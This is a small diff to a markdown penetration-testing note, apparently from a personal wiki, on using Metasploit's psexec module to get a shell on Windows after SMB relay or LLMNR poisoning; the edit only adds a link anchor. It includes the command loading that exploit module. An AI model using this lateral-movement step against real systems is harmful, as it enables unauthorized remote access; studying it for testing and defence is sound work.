@@ -3,7 +3,7 @@ Once we have [[SMB Relay|captured some hashes]] and [[LLMNR Poisoning|cracked so
 
 ### Metasploit
 
-We can use the `psexec` module available in metasploit to gain a shell as follow.
+We can use the `psexec` module available in metasploit to gain a shell as follow. ^shellAccess
 
 ```bash
 msf6 > use exploit/windows/smb/psexec
